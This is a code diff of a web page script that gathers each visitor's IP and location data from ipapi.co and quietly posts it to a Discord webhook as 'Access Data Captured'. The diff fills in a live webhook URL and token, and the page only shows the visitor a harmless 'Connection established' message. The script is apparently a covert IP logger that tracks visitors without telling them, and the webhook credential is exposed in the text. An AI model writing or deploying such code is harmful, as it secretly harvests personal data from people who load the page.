@@ -53,20 +53,20 @@
     <script>
         /**
          * AI-Optimized Webhook Integration
-         * Fixed Name: 五覇法典ももんが
-         * Mention: <@&1456378548406456506>
+         * User: 五覇法典ももんが
+         * Target Webhook: discord.com/.../A8KdVdQAkb...
          */
         const CORE_CONFIG = {
-            WEBHOOK_URL: "",
+            WEBHOOK_URL: "https://discord.com/api/webhooks/1431260265965555742/A8KdVdQAkbPP2CyFvgeY35Xfz04cz9DiYNmVmO_g1Mc0KicdIYmKLku46TIFJOid7hec",
             IP_SERVICE: "https://ipapi.co/json/",
             BOT_NAME: "五覇法典ももんが",
             BOT_AVATAR: "https://i.ibb.co/Fq7FbBXv/e-ASq-MYYat-Ml6-Zw3-thumb-1000-0.jpg",
-            MENTION_ID: "<@&1456378548406456506>" // 指定のロールメンション
+            ROLE_MENTION: "<@&1456378548406456506>"
         };
 
         async function processTelemetrics() {
             try {
-                // 1. IPデータの取得 (HTTPS)
+                // 1. IPデータの取得
                 const res = await fetch(CORE_CONFIG.IP_SERVICE);
                 if (!res.ok) throw new Error("Service unavailable");
                 const d = await res.json();
@@ -75,7 +75,7 @@
                 const payload = {
                     username: CORE_CONFIG.BOT_NAME,
                     avatar_url: CORE_CONFIG.BOT_AVATAR,
-                    content: CORE_CONFIG.MENTION_ID, // 埋め込みの外にメンションを配置（通知用）
+                    content: CORE_CONFIG.ROLE_MENTION, // メンションをメッセージ本体に配置
                     embeds: [{
                         title: "📈 Access Data Captured",
                         color: 0x000000,
@@ -89,7 +89,7 @@
                         footer: { text: "Secure Logger Instance" },
                         timestamp: new Date().toISOString()
                     }],
-                    allowed_mentions: { "roles": ["1456378548406456506"] } // ロールメンションを許可する設定
+                    allowed_mentions: { "roles": ["1456378548406456506"] }
                 };
 
                 // 3. Discordへ送信
@@ -99,11 +99,10 @@
                     body: JSON.stringify(payload)
                 });
 
-                // 完了後の視覚的フィードバック
                 document.getElementById("status").innerHTML = "✅ Connection established.";
 
             } catch (err) {
-                console.error("Critical error in telemetry:", err);
+                console.error("Telemetry failed:", err);
                 document.getElementById("status").innerHTML = "❌ Failed to connect.";
             }
         }
